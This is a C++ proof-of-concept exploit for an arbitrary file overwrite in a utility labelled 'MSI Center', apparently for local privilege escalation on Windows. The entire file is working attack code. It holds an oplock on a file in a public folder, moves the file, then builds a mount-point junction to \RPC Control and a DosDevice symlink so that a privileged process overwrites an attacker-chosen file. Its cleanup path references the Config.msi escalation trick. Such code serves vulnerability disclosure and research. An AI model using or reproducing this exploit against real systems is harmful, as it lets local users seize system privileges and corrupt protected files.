#include <Windows.h>
#include <Shlwapi.h>
#include <Msi.h>
#include <PathCch.h>
#include <AclAPI.h>
#include <iostream>
#include "resource.h"
#include "def.h"
#include "FileOplock.h"
#pragma comment(lib, "Msi.lib")
#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "PathCch.lib")
#pragma comment(lib, "rpcrt4.lib")
#pragma warning(disable:4996)

FileOpLock* oplock;
HANDLE hFile, hFile2, hFile3;
HANDLE hthread;
NTSTATUS retcode;
HMODULE hm = GetModuleHandle(NULL);
WCHAR dir[MAX_PATH] = { 0x0 };
WCHAR dir2[MAX_PATH] = { 0x0 };
WCHAR file[MAX_PATH] = { 0x0 };
WCHAR file2[MAX_PATH] = { 0x0 };
WCHAR file3[MAX_PATH] = { 0x0 };
WCHAR targetDeleteFile[MAX_PATH] = { 0x0 };


BOOL Move(HANDLE hFile);
HANDLE myCreateDirectory(LPWSTR file, DWORD access, DWORD share, DWORD dispostion);
LPWSTR  BuildPath(LPCWSTR path);
void load();
BOOL CreateJunction(LPCWSTR dir, LPCWSTR target);
VOID Fail();
VOID cb1();
BOOL DosDeviceSymLink(LPCWSTR object, LPCWSTR target);
BOOL DelDosDeviceSymLink(LPCWSTR object, LPCWSTR target);
LPWSTR CreateTempDirectory();
BOOL DeleteJunction(LPCWSTR dir);
void Trigger1();




BOOL Move(HANDLE hFile) {
	if (hFile == INVALID_HANDLE_VALUE) {
		printf("[!] Invalid handle!\n");
		return FALSE;
	}
	wchar_t tmpfile[MAX_PATH] = { 0x0 };
	RPC_WSTR str_uuid;
	UUID uuid = { 0 };
	UuidCreate(&uuid);
	UuidToString(&uuid, &str_uuid);
	_swprintf(tmpfile, L"\\??\\C:\\windows\\temp\\%s", str_uuid);
	size_t buffer_sz = sizeof(FILE_RENAME_INFO) + (wcslen(tmpfile) * sizeof(wchar_t));
	FILE_RENAME_INFO* rename_info = (FILE_RENAME_INFO*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY | HEAP_GENERATE_EXCEPTIONS, buffer_sz);
	IO_STATUS_BLOCK io = { 0 };
	rename_info->ReplaceIfExists = TRUE;
	rename_info->RootDirectory = NULL;
	rename_info->Flags = 0x00000001 | 0x00000002 | 0x00000040;
	rename_info->FileNameLength = wcslen(tmpfile) * sizeof(wchar_t);
	memcpy(&rename_info->FileName[0], tmpfile, wcslen(tmpfile) * sizeof(wchar_t));
	NTSTATUS status = pNtSetInformationFile(hFile, &io, rename_info, buffer_sz, 65);
	if (status != 0) {
		return FALSE;
	}
	return TRUE;
}

HANDLE myCreateDirectory(LPWSTR file, DWORD access, DWORD share, DWORD dispostion) {
	UNICODE_STRING ufile;
	HANDLE hDir;
	pRtlInitUnicodeString(&ufile, file);
	OBJECT_ATTRIBUTES oa = { 0 };
	IO_STATUS_BLOCK io = { 0 };
	InitializeObjectAttributes(&oa, &ufile, OBJ_CASE_INSENSITIVE, NULL, NULL);

	retcode = pNtCreateFile(&hDir, access, &oa, &io, NULL, FILE_ATTRIBUTE_NORMAL, share, dispostion, FILE_DIRECTORY_FILE | FILE_OPEN_REPARSE_POINT, NULL, NULL);

	if (!NT_SUCCESS(retcode)) {
		return NULL;
	}
	return hDir;
}
LPWSTR  BuildPath(LPCWSTR path) {
	wchar_t ntpath[MAX_PATH];
	swprintf(ntpath, L"\\??\\%s", path);
	return ntpath;
}
void load() {
	HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
	if (ntdll != NULL) {
		pRtlInitUnicodeString = (_RtlInitUnicodeString)GetProcAddress(ntdll, "RtlInitUnicodeString");
		pNtCreateFile = (_NtCreateFile)GetProcAddress(ntdll, "NtCreateFile");
		pNtSetInformationFile = (_NtSetInformationFile)GetProcAddress(ntdll, "NtSetInformationFile");

	}
	if (pRtlInitUnicodeString == NULL || pNtCreateFile == NULL) {
		printf("Cannot load api's %d\n", GetLastError());
		exit(0);
	}
}
BOOL CreateJunction(LPCWSTR dir, LPCWSTR target) {
	HANDLE hJunction;
	DWORD cb;
	wchar_t printname[] = L"";
	HANDLE hDir;
	hDir = CreateFile(dir, FILE_WRITE_ATTRIBUTES, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);

	if (hDir == INVALID_HANDLE_VALUE) {
		printf("[!] Failed to obtain handle on directory %ls.\n", dir);
		return FALSE;
	}

	SIZE_T TargetLen = wcslen(target) * sizeof(WCHAR);
	SIZE_T PrintnameLen = wcslen(printname) * sizeof(WCHAR);
	SIZE_T PathLen = TargetLen + PrintnameLen + 12;
	SIZE_T Totalsize = PathLen + (DWORD)(FIELD_OFFSET(REPARSE_DATA_BUFFER, GenericReparseBuffer.DataBuffer));
	PREPARSE_DATA_BUFFER Data = (PREPARSE_DATA_BUFFER)malloc(Totalsize);
	Data->ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
	Data->ReparseDataLength = PathLen;
	Data->Reserved = 0;
	Data->MountPointReparseBuffer.SubstituteNameOffset = 0;
	Data->MountPointReparseBuffer.SubstituteNameLength = TargetLen;
	memcpy(Data->MountPointReparseBuffer.PathBuffer, target, TargetLen + 2);
	Data->MountPointReparseBuffer.PrintNameOffset = (USHORT)(TargetLen + 2);
	Data->MountPointReparseBuffer.PrintNameLength = (USHORT)PrintnameLen;
	memcpy(Data->MountPointReparseBuffer.PathBuffer + wcslen(target) + 1, printname, PrintnameLen + 2);

	if (DeviceIoControl(hDir, FSCTL_SET_REPARSE_POINT, Data, Totalsize, NULL, 0, &cb, NULL) != 0)
	{
		printf("[+] Junction %ls -> %ls created!\n", dir, target);
		free(Data);
		return TRUE;

	}
	else
	{
		printf("[!] Error on creating junction %ls -> %ls : Error code %d\n", dir, target, GetLastError());
		free(Data);
		return FALSE;
	}
}
BOOL DeleteJunction(LPCWSTR path) {
	REPARSE_GUID_DATA_BUFFER buffer = { 0 };
	BOOL ret;
	buffer.ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
	DWORD cb = 0;
	IO_STATUS_BLOCK io;


	HANDLE hDir;
	hDir = CreateFile(path, FILE_WRITE_ATTRIBUTES, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS | FILE_OPEN_REPARSE_POINT, NULL);

	if (hDir == INVALID_HANDLE_VALUE) {
		printf("[!] Failed to obtain handle on directory %ls.\n", path);
		printf("%d\n", GetLastError());
		return FALSE;
	}
	ret = DeviceIoControl(hDir, FSCTL_DELETE_REPARSE_POINT, &buffer, REPARSE_GUID_DATA_BUFFER_HEADER_SIZE, NULL, NULL, &cb, NULL);
	if (ret == 0) {
		printf("Error: %d\n", GetLastError());
		return FALSE;
	}
	else
	{
		printf("[+] Junction %ls deleted!\n", dir);
		return TRUE;
	}
}
BOOL DosDeviceSymLink(LPCWSTR object, LPCWSTR target) {
	if (DefineDosDevice(DDD_NO_BROADCAST_SYSTEM | DDD_RAW_TARGET_PATH, object, target)) {
		printf("[+] Symlink %ls -> %ls created!\n", object, target);
		return TRUE;

	}
	else
	{
		printf("[!] Error in creating Symlink : %d\n", GetLastError());
		return FALSE;
	}
}

BOOL DelDosDeviceSymLink(LPCWSTR object, LPCWSTR target) {
	if (DefineDosDevice(DDD_NO_BROADCAST_SYSTEM | DDD_RAW_TARGET_PATH | DDD_REMOVE_DEFINITION | DDD_EXACT_MATCH_ON_REMOVE, object, target)) {
		printf("[+] Symlink %ls -> %ls deleted!\n", object, target);
		return TRUE;
	}
	else
	{
		printf("[!] Error in deleting Symlink : %d\n", GetLastError());
		return FALSE;
	}
}
VOID cb1() {
	
	printf("[+] Oplock triggered on %ls!\n", file);
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Fail, NULL, 0, NULL);
	
	if (!Move(hFile2)) {
		printf("[!] Failed to move file %ls!\n", file);
		exit(1);
	}
	//std::cout << "OpLock triggered, hit ENTER to close oplock\n";
	//getc(stdin);
	printf("[+] File %ls moved!\n", file);
	if (!CreateJunction(BuildPath(dir), L"\\RPC Control")) {
		printf("[!] Failed to create junction! Exiting!\n");
		exit(1);
	}
	if (!DosDeviceSymLink(L"GLOBAL\\GLOBALROOT\\RPC Control\\12345.txt", targetDeleteFile)) {
		printf("[!] Failed to create symlink! Exiting!\n");
		exit(1);
	}

}

LPWSTR CreateTempDirectory() {
	wchar_t wcharPath[MAX_PATH];
	if (!GetTempPathW(MAX_PATH, wcharPath)) {
		printf("failed to get temp path");
		return NULL;
	}

	_swprintf(dir, L"C:\\Users\\Public\\eoptest");
	printf("[+] Folder %ls created!\n", dir);
	_swprintf(file, L"%s\\12345.txt", dir);
	HANDLE hDir = myCreateDirectory(BuildPath(dir), FILE_WRITE_DATA, FILE_SHARE_READ, FILE_CREATE);
	if (hDir == NULL) {
		printf("Error on directory creation");
		return NULL;
	}
	CloseHandle(hDir);
	
	return file;
}
void Trigger1() {
	CreateTempDirectory();
	FileOpLock* oplock;
	do {
		hFile2 = CreateFile(file, GENERIC_READ | DELETE | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, CREATE_ALWAYS, FILE_FLAG_OVERLAPPED, NULL);
	} while (hFile2 == INVALID_HANDLE_VALUE);

	printf("[+] File %ls created!!\n", file);
	printf("[+] Create OpLock on %ls!\n", file);
	printf("[*] Ready! Click \"Export System Info\" and choose 12345.txt to trigger the vulnerability\n");
	printf("[*] Or for testing purposes, execute \"del %ls\" as admin or SYSTEM\n", file);

	oplock = FileOpLock::CreateLock(hFile2, cb1);
	if (oplock != nullptr) {
		oplock->WaitForLock(INFINITE);
		delete oplock;
	}
	printf("[+] OpLock released on %ls!\n", file);
}

VOID Fail() {
	
	Sleep(5000);
	printf("[!] Race condtion failed!\n");
	DeleteJunction(dir);
	DelDosDeviceSymLink(L"GLOBAL\\GLOBALROOT\\RPC Control\\12345.txt", L"\\??\\C:\\Config.msi::$INDEX_ALLOCATION");
	exit(1);
	
}

void printHelp() {
	printf(
		"MSI Center Arbitrary File Overwrite\n"
	);
	printf(
		".\\PoC.exe <operation> <argument>\n"
		"<operation> <argument>:\n"
		"\twrite <target file path>: overwrite file\n"
	);
	return;
}

int wmain(int argc, wchar_t* argv[])
{
	if (argc < 3) {
		printHelp();
		return 0;
	}
	load();

	// PoC.exe write C:\windows\test.txt
	if (wcscmp(argv[1], L"write") == 0) {
		_swprintf(targetDeleteFile, L"\\??\\%s", argv[2]);
			Trigger1();
	}

	else {
		printHelp();
		return 0;
	}

	DeleteJunction(dir);
	DelDosDeviceSymLink(L"GLOBAL\\GLOBALROOT\\RPC Control\\12345.txt", targetDeleteFile);
	return 0;

}